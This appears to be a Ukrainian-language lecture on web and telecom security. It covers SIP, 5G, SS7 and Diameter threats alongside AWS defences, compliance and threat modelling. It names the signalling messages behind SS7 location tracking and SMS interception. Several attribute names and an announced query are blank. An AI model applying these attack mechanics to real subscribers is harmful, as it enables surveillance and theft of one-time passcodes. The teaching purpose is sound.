Унікальна **поверхня атаки** телеком-веб включає: портали самообслуговування абонентів (billing, usage), де IDOR може призвести до витоку деталізованих записів дзвінків; OAM/OSS/BSS веб-інтерфейси управління мережею, де RCE може зупинити мережеві функції; NFV/SDN веб-панелі (OpenStack Horizon, ONAP); між-операторські API для роумінгу та interconnect; 5G SBA з HTTP/2-інтерфейсами між мережевими функціями.

Унікальні ризики включають: toll fraud через зловживання веб-API для ініціації платних дзвінків; витік CDR через IDOR-вразливості; підробку абонентської ідентичності; DoS-атаки на сигнальні мережеві функції, що призводять до масового збою сервісу.

## 19. VoIP/SIP — протоколи та вразливості

SIP (Session Initiation Protocol), визначений у RFC 3261, є текстовим протоколом, подібним до HTTP, для встановлення, зміни та завершення мультимедійних сесій. Архітектурно SIP-мережа складається з UA (User Agent), SIP Proxy (маршрутизація), Registrar (реєстрація URI↔IP) та B2BUA (Back-to-Back UA, зокрема Session Border Controller).

Кожен метод SIP є потенційним вектором атаки. **REGISTER** може бути використаний для **Registration Hijacking** — несанкціонованого перехоплення SIP-реєстрації, після чого всі вхідні дзвінки жертви перенаправляються до зловмисника. **INVITE** є вектором **SIP Flooding** (тисячі одночасних запитів на встановлення дзвінка вичерпують ресурси Proxy) та **Toll Fraud** (ініціювання платних дзвінків через скомпрометований SIP-акаунт). **BYE** дозволяє виконати **BYE Injection** — передчасне примусове завершення чужого активного дзвінка.

Відсутність шифрування медіапотоків є критичною проблемою: RTP-трафік без SRTP може бути перехоплений пасивним прослуховуванням трафіку в мережі. Захист SIP-інфраструктури вимагає комплексного підходу: SIP-over-TLS (SIPS) для шифрування сигналізації; SRTP (Secure Real-time Transport Protocol) для шифрування медіапотоків; SBC (Session Border Controller) як захисний бар'єр між публічними та приватними SIP-мережами; Digest Authentication із nonce для аутентифікації SIP-запитів; rate limiting на SIP Proxy (автоматичне блокування через fail2ban).

## 20. 5G SBA, Telecom API та Legacy-протоколи

Архітектура 5G Service-Based Architecture (SBA) радикально змінила телекомунікаційні мережі, перейшовши від спеціалізованих протоколів до HTTP/2 + JSON для взаємодії між мережевими функціями (NF). AMF (Access and Mobility Management), SMF (Session Management), UDM (Unified Data Management), PCF (Policy Control), NRF (Network Repository Function), NEF (Network Exposure Function) та AUSF (Authentication Server Function) — усі ці компоненти ядра мережі взаємодіють через стандартизовані REST API, визначені 3GPP.

Це відкриває нові вектори атаки, специфічні для веб. Незахищені SBI-інтерфейси між NF, навіть всередині однієї мережі, є вектором для lateral movement після компрометації одного компонента. Відсутність mutual TLS (mTLS) між NF, при якому лише одна сторона аутентифікує іншу, уможливлює атаки типу man-in-the-middle. Надмірно широкі OAuth 2.0-токени для NF-to-NF взаємодії порушують принцип least privilege. HTTP/2-специфічні атаки (CONTINUATION flood, HPACK bomb) можуть вичерпати ресурси NF.

Стандарт 3GPP TS 33.501 визначає обов'язкові вимоги безпеки: TLS 1.2+ для всіх SBI-інтерфейсів; OAuth 2.0 Client Credentials для NF-to-NF автентифікації з NRF як авторизаційним сервером; mTLS для зовнішніх з'єднань через інтерфейс N32 між операторами; PRINS (Protection at SEPP) для шифрування між операторами.

**NEF (Network Exposure Function)** є шлюзом між зовнішніми розробниками та внутрішньою 5G-мережею. Ініціатива **CAMARA** (Linux Foundation + GSMA) стандартизує відкриті телеком API: Quality on Demand, SIM Swap, Number Verification, Device Location, Network Slicing. SIM Swap API є особливо критичним з точки зору безпеки: банки використовують його для перевірки, чи не була замінена SIM-картка абонента перед надсиланням SMS OTP. Зловживання цим API може призвести до обходу двофакторної автентифікації.

**SS7** (Signaling System 7) — протокол 1975 року без вбудованої автентифікації — досі залишається вразливим до серйозних атак: Location Tracking (відстеження місцезнаходження абонента), SMS Interception (перехоплення SMS OTP), несанкціоноване переадресування дзвінків, збір IMSI-ідентифікаторів. NIST SP 800-63B рекомендує уникати SMS як єдиного фактора MFA саме через вразливість SS7. Захист вимагає SS7 Firewall на рівні STPs та моніторингу аномальних патернів.

## 21. AWS Security Services та DevSecOps Pipeline

AWS надає комплексний набір сервісів безпеки для захисту веб-застосунків. **AWS WAF v2** організований ієрархічно: Web ACL прив'язується до ресурсу (ALB, CloudFront, API Gateway), містить Rule Groups із окремими Rules. AWS Managed Rule Groups забезпечують готовий захист: `AWSManagedRulesCommonRuleSet` (OWASP Top 10), `AWSManagedRulesSQLiRuleSet` (SQL Injection), `AWSManagedRulesKnownBadInputsRuleSet`, `AWSManagedRulesBotControlRuleSet` (боти та скрейпери), `AWSManagedRulesATPRuleSet` (Account Takeover Protection).

**AWS Shield** надається у двох варіантах. Shield Standard автоматично захищає від L3/L4-атак (UDP flood, SYN flood, ICMP flood, DNS amplification) і є безкоштовним для всіх клієнтів AWS. Shield Advanced ($3,000/місяць) додає розширений L7-захист у поєднанні з WAF, 24/7 доступ до Shield Response Team (SRT), фінансовий захист (компенсація вартості auto-scaling під час атаки) та детальну аналітику.

**Amazon CloudFront** функціонує як перший рівень захисту: 450+ PoP по всьому світу поглинають атакуючий трафік на edge, до origin-сервера доходить лише відфільтрований трафік. Origin Access Control (OAC) гарантує, що S3-сховища доступні виключно через CloudFront. Geo-restriction та Field-Level Encryption є додатковими інструментами захисту.

**DevSecOps Pipeline** для веб-застосунків в AWS інтегрує безпеку на кожному етапі: Source → SAST (Semgrep/CodeGuru) → Dependency Scan (Snyk) → Build (CodeBuild) → Image Scan (Inspector V2/Trivy) → DAST (OWASP ZAP) → Deploy (CodeDeploy) → Production (GuardDuty + WAF). Security Gates — автоматична зупинка pipeline при виявленні критичних вразливостей — є обов'язковим елементом зрілого DevSecOps.

Управління секретами в pipeline реалізується через AWS Secrets Manager:

```yaml
# buildspec.yml — безпечне отримання секрету
phases:
  pre_build:
    commands:
      - export DB_PASS=$(aws secretsmanager get-secret-value \
          --secret-id prod/db/password --query SecretString --output text)
```

## 22. Регуляторна відповідність та практичний кейс

**PCI DSS v4.0** встановлює обов'язкові вимоги для організацій, що обробляють платіжні картки. Ключові вимоги для веб-застосунків: Req 6.4 — обов'язкова наявність WAF для всіх публічних веб-застосунків, що обробляють CHD; Req 6.3 — виявлення та захист від вразливостей через Inspector та WAF; Req 8.3 — MFA для всіх не-консольних доступів до CDE; Req 10.2 — логування всіх доступів до Cardholder Data через CloudTrail та WAF Logs; Req 11.3 — обов'язкове penetration testing не рідше одного разу на рік.

**GDPR** вимагає впровадження Privacy by Design у веб-застосунках: мінімізація даних (збір лише необхідних даних), право на видалення (API для безповоротного знищення персональних даних), повідомлення про порушення протягом 72 годин (реалізується через CloudWatch Alarms). **ISO/IEC 27034** визначає процес управління безпекою застосунків (ASMP) та бібліотеку контролів безпеки.

Практичний кейс демонструє реалізацію захищеного self-service порталу для мільйонного телеком-оператора. Архітектура включає: Route 53 з GeoDNS (обмеження країною) → CloudFront + WAF (OWASP CRS + Bot Control) → Cognito з MSISDN-автентифікацією + TOTP MFA → ALB → ECS (React frontend + Node.js API) → API Gateway → Lambda Authorizer → BSS API → RDS Aurora (CDR) + ElastiCache (session). Кожна із задокументованих загроз (IDOR CDR, SQL Injection, account takeover, DDoS, toll fraud, CDR витік) має відповідний конкретний захід у цій архітектурі.

## 23. Типові помилки, антипатерни та підсумок

Практика аудитів безпеки виявляє стійкі антипатерни, що повторюються в різних організаціях та командах. Серед найчастіших помилок розробників: конкатенація SQL-рядків замість prepared statements; зберігання паролів у MD5 або SHA-1 без солі; хардкодування API-ключів і паролів у вихідному коді; відключення перевірки SSL-сертифікатів (`verify=False`); відсутність server-side авторизації при наявності лише client-side приховування елементів; виведення stack trace у продуктивному середовищі; необмежений розмір та відсутність типової перевірки для файлів, що завантажуються.

Не менш поширені хибні уявлення про безпеку: «WAF захистить від усього» — WAF не розуміє бізнес-логіку і не може виявити IDOR; «HTTPS означає безпеку» — HTTPS шифрує лише транспортний канал, але не захищає від вразливостей застосунку; «ми маленькі — нас не атакуватимуть» — автоматизовані боти атакують усіх підряд, незалежно від розміру; «безпека — відповідальність QA» — Shift-Left означає, що кожен розробник несе відповідальність за безпеку свого коду; «firewall закриває порти, нас не зламають» — L7-атаки через порт 443 є основним вектором у сучасному ландшафті загроз.

Зведена таблиця AWS Security Services охоплює всі рівні захисту: AWS WAF ($5/Web ACL + $1/млн запитів) захищає L7 від OWASP Top 10 та ботів; Shield Standard (безкоштовно) — L3/L4 автоматично; Shield Advanced ($3,000/міс) — L3/L4/L7 з SRT; CloudFront (від $0.0085/GB) — CDN + edge security; API Gateway ($3.50/млн REST запитів) — API authentication + throttling; Cognito (50K MAU безкоштовно) — Identity з MFA та OAuth 2.0; GuardDuty (за кількість подій) — ML-детекція загроз; Security Hub ($0.001/finding) — агрегація compliance findings.

**Золоті правила безпеки веб-застосунків**, які резюмують увесь матеріал лекції: ніколи не довіряй вхідним даним — validate on server, завжди; параметризуй усі запити — жодної конкатенації SQL або shell-команд; перевіряй авторизацію на кожному endpoint, не покладаючись на логіку UI; WAF є лише одним шаром захисту, не єдиним; Shift-Left означає безпеку з першого рядка коду та з першої хвилини проектування; моніторинг 24/7 — без нього атаки тривають місяцями непоміченими.

Безпека веб-застосунків у хмарному та телекомунікаційному контексті є динамічною дисципліною, що вимагає постійного вдосконалення знань і практик. Стандарти OWASP, 3GPP, GSMA та NIST надають систематизовану базу для побудови захищених систем, однак лише поєднання технічної грамотності, зрілих процесів розробки та культури безпеки в організації здатне забезпечити ефективний захист сучасної телекомунікаційної інфраструктури.

## Розширений аналіз: механізми аутентифікації у хмарних та телеком-системах

### 24. Поглиблений розгляд OAuth 2.0 та JWT у практичному застосуванні

Реалізація OAuth 2.0 у виробничих системах потребує розуміння тонкощів, що виходять за межі базової специфікації. Розглянемо Authorization Code Flow із PKCE більш детально, оскільки саме цей механізм рекомендований для публічних клієнтів (Single Page Applications, мобільні додатки), де неможливо безпечно зберегти client_secret.

PKCE (Proof Key for Code Exchange) вирішує проблему перехоплення authorization code: клієнт генерує випадковий рядок `code_verifier` (43–128 символів), обчислює його SHA-256-хеш `code_challenge` і передає останній разом із запитом авторизації. При обміні code на токен клієнт надсилає оригінальний `code_verifier`, і сервер авторизації перевіряє відповідність хешу. Перехопивши лише authorization code, зловмисник не зможе завершити обмін без знання `code_verifier`.

Ризики управління JWT-токенами в продуктивних системах потребують окремої уваги. **Revocation** (відкликання) є ключовою проблемою: JWT є самодостатнім токеном і, на відміну від opaque-токенів, не потребує звернення до сервера авторизації для перевірки. Це означає, що відкликати конкретний JWT до закінчення його терміну дії складно — необхідно підтримувати blocklist відкликаних токенів або використовувати дуже короткі терміни дії (access token: 5–15 хвилин) у поєднанні з довгоживучими refresh tokens.

Сценарій **token rotation** для refresh tokens є кращою практикою: при кожному використанні refresh token видається новий refresh token, а попередній інвалідується. Це дозволяє виявляти крадіжку refresh token: якщо вкрадений токен буде використаний зловмисником, легітимний користувач при наступній спробі оновлення отримає помилку (оскільки його refresh token уже було ротовано), що сигналізує про компрометацію.

У контексті 5G NF-to-NF автентифікації OAuth 2.0 Client Credentials Flow є єдиним рекомендованим механізмом. NRF (Network Repository Function) виступає як Authorization Server: кожна NF реєструється в NRF зі своїм профілем та отримує access token для взаємодії з іншими NF. Токен містить інформацію про дозволені операції (`snssai`, `nfType`, `allowedOperations`), що реалізує принцип least privilege на рівні мережевих функцій.

### 25. Безпека мобільних застосунків — поглиблений аналіз

OWASP Mobile Top 10 (2024) визначає специфічні ризики мобільних застосунків, що частково перетинаються з веб-вразливостями, але мають свою специфіку. **M1 — Improper Credential Usage** є найпоширенішою мобільною вразливістю: API-ключі та паролі, захардкодовані у вихідному коді, легко витягуються зворотнім інжинірингом APK через `apktool`, `jadx` або `strings`.

**M3 — Insecure Authentication/Authorization** охоплює проблеми, специфічні для мобільного середовища: зберігання JWT або session tokens у незахищених сховищах (`SharedPreferences` без шифрування на Android, незашифровані `NSUserDefaults` на iOS), відсутність SSL pinning (що дозволяє виконати MITM-атаку через проксі-перехоплення), надмірно тривалий термін дії токенів мобільного клієнта.

**M9 — Insecure Data Storage** є критичним ризиком: чутливі дані можуть зберігатись у логах (logcat Android), у зовнішньому сховищі (SD-карта), у незашифрованих базах SQLite. Зовнішній зловмисник, який отримав фізичний доступ до пристрою або який інсталював шкідливий додаток із зайвими дозволами, може читати ці дані.

Захист Android-застосунків базується на кількох ключових механізмах. **Android Keystore** зберігає криптографічні ключі в Trusted Execution Environment (TEE) або апаратному модулі безпеки, унеможливлюючи їх витік навіть при компрометації програмного середовища. **Network Security Config** дозволяє декларативно налаштувати certificate pinning, заборону cleartext трафіку та trusted CAs:

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <pin digest="SHA-256">base64encodedSPKI==</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

**ProGuard/R8** виконує обфускацію та мінімізацію байт-коду, суттєво ускладнюючи зворотній інжиніринг. **Play Integrity API** дозволяє серверній частині додатку перевірити цілісність Android-середовища: чи не є пристрій вкоріненим (rooted), чи не запущений застосунок у модифікованому середовищі.

На iOS відповідними механізмами є **Secure Enclave** (апаратне зберігання ключів), **Keychain** (захищене сховище credentials), **App Transport Security** (примусове використання TLS 1.2+), **Face ID/Touch ID** через LocalAuthentication framework. Специфічним ризиком iOS є jailbreak: на зламаному пристрої зловмисне ПЗ може отримати доступ до Keychain та перехоплювати мережевий трафік.

### 26. AWS API Gateway — повний огляд архітектури захисту

AWS API Gateway надає три типи API з різними характеристиками безпеки. **REST API** є найбільш функціональним: підтримує кешування відповідей, схемну валідацію запитів через Models та Request Validators, усі типи авторизаторів, Stage Variables та Canary deployments. **HTTP API** є легковаговою альтернативою з меншою вартістю, але обмеженими можливостями (без WAF-інтеграції на рівні Stage, обмежені mapping templates). **WebSocket API** підтримує двоспрямовану комунікацію в реальному часі через persistent connections — критично важливо для VoIP та телеком-застосунків.

**Lambda Authorizer** є найбільш гнучким механізмом авторизації: кастомна Lambda-функція отримує токен або параметри запиту, виконує будь-яку логіку перевірки та повертає IAM Policy Document. Це дозволяє реалізувати будь-яку схему авторизації — від перевірки власного JWT до інтеграції з legacy AAA-системами телекому. Кешування результатів авторизатора (TTL до 3600 секунд) суттєво знижує навантаження та latency.

Для захисту від DDoS та зловживань на рівні API Gateway необхідно налаштувати: **Throttling** на рівні Stage (наприклад, 10,000 req/s burst + 5,000 req/s steady state за замовчуванням) та на рівні методу; **Usage Plans** із квотами споживання для різних категорій клієнтів; **AWS WAF** прив'язку для фільтрації шкідливого трафіку. Конфігурація через Terraform:

```hcl
resource "aws_api_gateway_usage_plan" "partner" {
  name = "partner-plan"
  throttle_settings {
    burst_limit = 100
    rate_limit  = 50
  }
  quota_settings {
    limit  = 10000
    period = "DAY"
  }
}
```

**mTLS (mutual TLS)** для API Gateway дозволяє реалізувати двосторонню аутентифікацію — сервер автентифікує клієнта за його X.509-сертифікатом. Це є стандартом для B2B-інтеграцій між телекомунікаційними операторами, де кожен оператор-партнер отримує унікальний клієнтський сертифікат.

### 27. CloudFront — розширені можливості безпеки

Amazon CloudFront є не просто CDN для прискорення доставки контенту, але й повноцінним компонентом безпекової архітектури. Розглянемо ключові можливості, що виходять за межі базового кешування.

**Origin Access Control (OAC)** є поліпшеною заміною застарілого OAI (Origin Access Identity). OAC підписує запити від CloudFront до S3 за допомогою AWS Signature Version 4, гарантуючи, що S3-bucket доступний виключно через CloudFront. Налаштування S3 Bucket Policy:

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "cloudfront.amazonaws.com"},
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::my-bucket/*",
    "Condition": {
      "StringEquals": {
        "AWS:SourceArn": "arn:aws:cloudfront::123:distribution/DIST_ID"
      }
    }
  }]
}
```

**Signed URLs та Signed Cookies** забезпечують захист преміум-контенту: доступ до захищеного об'єкта можливий лише за наявності підписаного URL із обмеженим терміном дії та (опціонально) обмеженням за IP-адресою. Підпис обчислюється з використанням RSA-закритого ключа CloudFront Key Pair.

**CloudFront Functions та Lambda@Edge** дозволяють виконувати логіку безпеки на edge-вузлах. CloudFront Functions (JavaScript, виконання < 1 мс) ідеально підходить для: перевірки та редіректу HTTP-заголовків, валідації підписаних токенів, нормалізації URL-запитів перед кешуванням. Lambda@Edge (Node.js або Python, виконання 1–5 мс) надає більш широкі можливості для реалізації A/B-тестування, складної логіки авторизації або динамічного відображення контенту.

**Geo-restriction** дозволяє обмежити доступ до контенту за країнами на рівні CDN, що є ефективним заходом відповідності вимогам регуляторів або ліцензійних угод. Для більш тонкого контролю можна використовувати Lambda@Edge разом із базою GeoIP для реалізації власної логіки гео-фільтрації.

### 28. Поглиблений аналіз SS7 та Diameter вразливостей

SS7-вразливості залишаються однією з найсерйозніших проблем безпеки в телекомунікаційній галузі, незважаючи на те, що протокол існує вже понад 50 років. Критичність цих вразливостей визначається тим, що SS7 є глобальним стандартом міжнародного зв'язку — компрометація SS7-вузла однієї мережі потенційно надає доступ до абонентів будь-якої мережі у світі.

Атака **Location Tracking** через SS7 використовує повідомлення `SendRoutingInfo` (SRI) або `ProvideSubscriberInfo` (PSI): зловмисник, маючи доступ до SS7-мережі, може надіслати ці запити до HLR/HSS цільового оператора і отримати у відповідь поточне місцезнаходження абонента (ідентифікатор базової станції). З огляду на те, що базові станції мають типовий радіус покриття 200–500 метрів у містах, точність локалізації є достатньою для стеження.

**SMS Interception** реалізується через перенаправлення: зловмисник реєструє жертву в підставному VLR (Visitor Location Register) через повідомлення `UpdateLocation`. Усі подальші SMS-повідомлення, адресовані жертві, будуть перенаправлені через підставний вузол, де їх можна прочитати. Саме цей механізм робить SMS OTP ненадійним методом двофакторної аутентифікації для критичних систем.

GSMA FS.11 класифікує SS7-атаки за трьома категоріями та рекомендує відповідні контрзаходи. **Категорія 1** (Blocking): операторам слід блокувати повідомлення від невідомих джерел або ненормальні комбінації параметрів, що не відповідають поточному стану абонента. **Категорія 2** (Filtering): обмеження інформаційних запитів між операторами — наприклад, запити SRI повинні оброблятися лише якщо є підстава вважати, що абонент роумінгує в мережі запитувача. **Категорія 3** (Detection): виявлення аномальних патернів через Machine Learning — незвично висока частота запитів щодо одного абонента, запити з нетипових джерел, географічно неможливі переміщення.

**Diameter** (RFC 3588) є спадкоємцем RADIUS і використовується в 4G LTE для EPC-сигналізації (автентифікація через S6a, QoS через Gx, роумінг через S9). Попри сучасніший дизайн, Diameter успадковує принципові проблеми безпеки SS7 — відсутність кінцевої аутентифікації між операторами. **Diameter Firewall** є стандартним засобом захисту, що фільтрує команди та параметри відповідно до очікуваних патернів роумінгового трафіку.

Для операторів, що мігрують на 5G, критично важливо ізолювати 5G-ядро від застарілої SS7-інфраструктури. 5G SBA не використовує SS7 для внутрішньомережевої сигналізації, проте підтримка SS7-шлюзів для backward compatibility із 2G/3G залишається вектором атаки.

### 29. Incident Response для веб-застосунків

Реагування на інциденти безпеки веб-застосунків потребує завчасно підготовленого плану (Incident Response Plan) та регулярних тренувань. Стандарт NIST SP 800-61 визначає чотири фази реагування: підготовка, виявлення та аналіз, стримування та ліквідація, відновлення та висновки.

**Підготовча фаза** включає формування команди реагування (CSIRT), визначення категорій інцидентів та відповідних SLA реагування (критичний — 15 хв, високий — 1 год, середній — 4 год), налаштування інструментів виявлення та сповіщення, проведення tabletop exercises із симуляцією типових сценаріїв (SQL Injection, account takeover, DDoS, data breach).

**Виявлення та аналіз** веб-інцидентів базується на кореляції подій із декількох джерел: WAF logs (заблоковані запити, аномальні патерни), CloudTrail (підозрілі API-дії), GuardDuty findings (аномальні виклики до чутливих ресурсів), VPC Flow Logs (незвичні мережеві потоки), Application logs (аномальна кількість помилок, підозрілі endpoint-дзвінки). Ключовим є встановлення базової лінії нормальної поведінки системи (baseline) для виявлення відхилень.

**Containment** веб-атак може включати: ізоляцію скомпрометованого компонента через зміну Security Group правил; блокування атакуючих IP через WAF IP Set; відкликання скомпрометованих IAM credentials та JWT токенів; переведення WAF у режим повного блокування; ротацію паролів та сесійних секретів.

**Криміналістичний аналіз** (forensics) у хмарному середовищі вимагає специфічних підходів: збереження snapshot'ів дисків EC2 до завершення forensics, збереження memory dump для аналізу in-memory malware, збереження всіх релевантних логів (CloudTrail, VPC Flow Logs, WAF Logs) до можливого видалення, документування ланцюжку збереження доказів (chain of custody) для правових процесів.

**Post-Incident Review** є критично важливим: необхідно встановити root cause, визначити, як вразливість потрапила в продуктивне середовище (відсутність в SAST, обхід WAF), розробити запобіжні заходи та оновити runbook реагування. Кожен інцидент є можливістю вдосконалити систему безпеки.

### 30. Compliance та аудит для телеком-операторів у хмарному середовищі

Телекомунікаційні оператори функціонують в умовах жорсткого регуляторного середовища, що накладає специфічні вимоги на безпеку веб-застосунків та хмарних розгортань.

**GSMA CLP.13** (Cloud Security Guidelines) є галузевим стандартом для телекомунікаційних операторів, що описує вимоги до безпеки хмарних інфраструктур, зокрема: управління ідентифікацією та доступом (IAM), шифрування даних at rest та in transit, мережева ізоляція та сегментація, управління вразливостями, логування та моніторинг, Business Continuity та Disaster Recovery.

**CALEA (Communications Assistance for Law Enforcement Act)** у США та аналогічне законодавство інших юрисдикцій вимагають від операторів реалізації технічних можливостей для законного перехоплення комунікацій (LAWFUL INTERCEPT). Веб-застосунки, що надають доступ до функцій управління мережею, повинні мати надійний audit trail всіх адміністративних дій.

**ISO/IEC 27034** (Application Security) визначає Application Security Management Process (ASMP) та Application Security Controls Library (ASCL) — формалізований підхід до управління безпекою застосунків на рівні організації. Для крупних операторів впровадження ASMP є ключовим елементом демонстрації зрілості програми безпеки.

Практичне впровадження compliance в AWS реалізується через комбінацію сервісів. **AWS Audit Manager** автоматизує збір доказів відповідності вимогам PCI DSS, GDPR, ISO 27001, HIPAA. **AWS Config** відстежує конфігурацію ресурсів і виявляє відхилення від security baselines (наприклад, відкриті S3-buckets, незашифровані RDS-інстанси). **AWS Macie** використовує Machine Learning для виявлення та класифікації чутливих даних (PII, PCI DSS-дані) у S3. **AWS Artifact** надає безкоштовний доступ до звітів SOC 1/2/3, PCI DSS AOC та ISO 27001-сертифікатів для демонстрації відповідності аудиторам.

Для ефективного управління compliance необхідно визначити **Security Baselines** — набір обов'язкових конфігурацій для всіх ресурсів. AWS Security Hub агрегує findings із GuardDuty, Inspector, Macie та AWS Config і автоматично оцінює відповідність стандартам (CIS AWS Foundations Benchmark, PCI DSS, AWS Foundational Security Best Practices). Відхилення від baseline автоматично сигналізуються відповідальним командам.

**Penetration Testing** в AWS вимагає попереднього дотримання AWS Penetration Testing Policy. Власні інстанси та сервіси можна тестувати без попереднього дозволу, проте дії, що можуть вплинути на інфраструктуру AWS або інших клієнтів (DDoS, port scanning поза власними ресурсами), є забороненими. Для телеком-операторів рекомендоване щоквартальне pentesting із залученням зовнішніх спеціалізованих команд.

## Заключні рекомендації та шляхи подальшого розвитку

Безпека веб-застосунків є не разовим проєктом, а безперервним процесом, що вимагає систематичного підходу та постійного розвитку. Для телекомунікаційних операторів, що функціонують у хмарному середовищі, можна виділити кілька пріоритетних напрямків розвитку програми безпеки.

**Зрілість DevSecOps** вимірюється рівнем інтеграції безпеки в CI/CD pipeline. На початковому рівні зрілості безпекова перевірка є мануальною та відбувається поза pipeline. Середній рівень передбачає автоматизований SAST та SCA у pipeline із сповіщеннями без блокування. Зрілий рівень — автоматичне блокування pipeline при виявленні критичних вразливостей, DAST у staging-середовищі, автоматичні security gates.

**Програма Security Champions** передбачає призначення в кожній розробницькій команді відповідальної особи зі знаннями безпеки, яка є містком між командою безпеки та розробниками. Security Champions беруть участь у threat modeling, проводять security code reviews, пропагують best practices всередині команди. Ця програма є одним із найефективніших способів масштабування культури безпеки в організації.

**Bug Bounty програми** дозволяють залучити зовнішніх дослідників безпеки (ethical hackers) для виявлення вразливостей в обмін на фінансову винагороду. Платформи HackerOne та Bugcrowd надають готову інфраструктуру для управління програмою. Для телеком-операторів критично важливо чітко визначити scope (які системи є в межах програми) та виключення (CALEA-функціонал, SS7-вузли). Успішні bug bounty програми таких операторів, як AT&T, T-Mobile, Vodafone, демонструють, що зовнішня спільнота дослідників є ефективним доповненням до внутрішньої програми безпеки.

Нарешті, **навчання та обізнаність** є фундаментальним чинником безпеки. Технічні контролі можуть бути обходжені через людський фактор: фішинг, соціальна інженерія, недотримання процедур. Регулярні навчання з безпечного кодування для розробників, симуляції фішингових атак для всіх співробітників, а також процедурні тренування для команд безпеки та операційних команд — усе це формує культуру безпеки, без якої жодна технічна програма не досягне повної ефективності.

## Додаток: Практичні конфігурації та чеклісти

### Чеклист безпеки при деплої веб-застосунку

Перед введенням в експлуатацію будь-якого веб-застосунку, особливо у телекомунікаційному контексті, необхідно пройти структурований чеклист перевірки. Цей чеклист базується на вимогах OWASP ASVS рівня 2 та охоплює ключові аспекти безпеки.

**Автентифікація та управління сесіями.** Перевіряється: чи використовується bcrypt або Argon2id для хешування паролів (мінімальний cost factor 12 для bcrypt); чи реалізовано захист від brute force (account lockout після 5 невдалих спроб); чи встановлено TOTP-базовану MFA для всіх адміністративних аккаунтів; чи генеруються session ID криптографічно стійким генератором (128 bit entropy); чи встановлено атрибути , ,  для сесійних cookies; чи інвалідується сесія на стороні сервера після logout; чи налаштовано idle timeout (15-30 хвилин) та абсолютний timeout (8 годин).

**Контроль доступу.** Перевіряється: чи реалізовано перевірку авторизації на кожному backend endpoint (не тільки на рівні UI); чи застосовується принцип deny-by-default; чи перевіряється ownership ресурсу при доступі (захист від IDOR); чи немає доступу до адміністративних endpoint для звичайних користувачів; чи логуються всі порушення авторизації.

**Захист від ін'єкцій.** Перевіряється: чи використовуються prepared statements/parameterized queries для всіх DB-запитів; чи застосовується ORM із захистом від ін'єкцій; чи валідуються вхідні дані за whitelist на сервері; чи немає динамічного конструювання shell-команд із вхідними даними; чи налаштовано WAF із SQL Injection rules.

**Криптографія та TLS.** Перевіряється: чи підтримуються виключно TLS 1.2+ (вимкнено TLS 1.0/1.1); чи використовуються лише strong cipher suites (ECDHE + AES-GCM); чи встановлено HSTS з max-age не менше 31536000; чи перевіряються SSL-сертифікати (не встановлено verify=False); чи немає захардкоджених секретів у коді (перевірка через git-secrets або truffleHog); чи зберігаються секрети в Secrets Manager або Vault.

**HTTP Security Headers.** Перевіряється наявність та коректність: ,  (без ), , , , . Автоматизований скан через securityheaders.com або Mozilla Observatory.

**Логування та моніторинг.** Перевіряється: чи логуються всі автентифікаційні події; чи логуються порушення авторизації; чи немає чутливих даних (паролів, токенів, PAN) у логах; чи централізовані логи в SIEM; чи налаштовані алерти для критичних подій (brute force, SQLi, масовий 403); чи перевірено retention period логів (мінімум 90 днів онлайн, 1 рік архів для PCI DSS).

### Конфігурація AWS WAF для типового веб-застосунку

Налаштування AWS WAF потребує балансування між захистом та мінімальною кількістю false positives. Рекомендована послідовність впровадження: спочатку всі правила переводяться в режим Count (тільки логування, без блокування) на 2–4 тижні для аналізу трафіку, після чого поступово правила переводяться в режим Block із моніторингом false positives.

Базовий набір Managed Rule Groups для продуктивного веб-застосунку:  (priority 10) із виключенням правил, що викликають false positives у конкретному застосунку;  (priority 20);  (priority 30); rate-based rule для обмеження запитів з одного IP (priority 1, limit 2000 req/5 min). Для телеком-порталів із B2B-інтеграціями рекомендується додати whitelist правило для trusted partner IP ranges із найвищим пріоритетом (priority 0, action Allow), що виключає партнерів зі стандартних перевірок WAF.

Логування WAF та аналіз через Athena дозволяють виявляти патерни атак. Типовий SQL-запит для аналізу заблокованих запитів:

### Threat Modeling — практичне застосування методології STRIDE

Threat Modeling є обов'язковою практикою безпечного проектування, що дозволяє систематично виявляти потенційні загрози до початку реалізації. Процес складається з чотирьох кроків: декомпозиція системи, визначення загроз, оцінка ризиків, визначення контрзаходів.

**Декомпозиція** передбачає побудову Data Flow Diagram (DFD): визначення компонентів системи (браузер, веб-сервер, БД, сторонні API), потоків даних між ними, точок довіри (trust boundaries) та сховищ даних. Для кожного компоненту та потоку даних застосовується методологія STRIDE.

**Spoofing** — загроза підробки ідентичності. Застосовно до веб-застосунку: підробка ідентичності користувача через викрадений session cookie, підробка OAuth-токена. Контрзахід: надійна аутентифікація, HTTPS, HttpOnly cookies.

**Tampering** — загроза модифікації даних. SQL Injection (модифікація запиту до БД), CSRF (виконання несанкціонованих дій від імені користувача). Контрзахід: параметризовані запити, CSRF token, цифровий підпис критичних повідомлень.

**Repudiation** — загроза відмови від виконаних дій. Без належного логування неможливо довести, що конкретний користувач виконав певну дію. Контрзахід: comprehensive audit logging із digital signing.

**Information Disclosure** — загроза витоку інформації. IDOR, надмірно інформативні повідомлення про помилки, витік через HTTP-заголовки. Контрзахід: авторизаційні перевірки на кожному запиті, generic error messages, мінімальні HTTP-відповіді.

**Denial of Service** — загроза відмови в обслуговуванні. DDoS, ReDoS (Regular Expression DoS), Zip Bomb. Контрзахід: rate limiting, regex timeout, обмеження розміру запиту.

**Elevation of Privilege** — загроза підвищення привілеїв. Broken Access Control, SQL Injection для читання даних адміністратора. Контрзахід: RBAC, deny-by-default, мінімальні привілеї БД.

Для телеком-систем threat modeling повинен додатково охоплювати загрози, специфічні для галузі: toll fraud, SIM swap зловживання, витік CDR, несанкціоноване перенаправлення дзвінків, зловживання роумінговими API. Регулярне оновлення threat model при зміні архітектури або додаванні нових функцій є критично важливим — загрози змінюються разом із системою.

## Глосарій ключових термінів

**ASVS (Application Security Verification Standard)** — стандарт верифікації безпеки застосунків OWASP із трьома рівнями вимог.

**BOLA (Broken Object Level Authorization)** — вразливість, що дозволяє отримати доступ до об'єктів інших користувачів через маніпуляцію ідентифікаторами.

**CAMARA** — ініціатива Linux Foundation та GSMA зі стандартизації відкритих телеком API.

**CDR (Call Detail Record)** — детальний запис дзвінка, що містить персональні дані абонента.

